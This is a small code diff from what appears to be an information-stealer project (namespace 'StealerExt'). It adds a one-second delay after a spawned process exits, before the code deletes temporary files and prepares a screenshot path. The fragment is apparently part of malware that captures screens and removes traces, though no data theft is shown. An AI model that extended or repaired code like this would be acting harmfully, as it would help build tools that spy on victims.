@@ -40,6 +40,7 @@ namespace StealerExt
 			proc.EnableRaisingEvents = true;
 			proc.Start();
 			proc.WaitForExit();
+            Thread.Sleep(1000);
 			File.Delete(idk);
 			File.Delete(idk2);
 			string ss = API.Temp + "capture.png";
